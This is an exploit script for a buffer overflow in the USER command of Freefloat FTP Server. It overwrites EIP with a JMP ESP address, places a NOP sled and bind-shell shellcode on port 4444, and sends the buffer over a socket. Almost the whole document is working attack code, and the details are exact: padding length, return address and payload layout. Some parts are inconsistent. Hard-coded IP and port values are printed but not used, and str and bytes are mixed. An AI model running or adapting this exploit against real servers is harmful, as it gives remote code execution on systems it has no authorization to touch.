# Exploit Title: Freefloat FTP Server Buffer Overflow Vulnerability
# Date: 12/05/2010
# Author: 0v3r
# Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
# Tested on: Windows XP SP3 EN
# CVE: N/A

#!/usr/bin/python

import socket
from payload import buf
def shell_attack(target_machine, target_port):
#Bind Shell shellcode port 4444
	junk1  = b"\x41" * 230
	eip    = b"\x53\x93\x42\x7E"  #7E429353 JMP ESP
	nops   = b"\x90" * 16
	junk2  = b"\x43" * (1000 - len(junk1 + eip + nops + buf))

	buff   = junk1 + eip + nops + buf + junk2 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


	




	ip   = "192.168.10.44"
	port = "21"

	try:
		print("[-] Connecting to " + ip + " on port " + port + "\n")
		s.connect((target_machine,target_port))
		data = s.recv(1024)
		print("[-] Sending exploit...")
		s.send('USER ' + buff + '\r\n')
		s.close()
		print("[-] Exploit successfully sent...")
		print("[-] Connect to " + ip + " on Given Port")
	except:
		print("[-] Connection error...")
		print("[-] Check if victim is up.")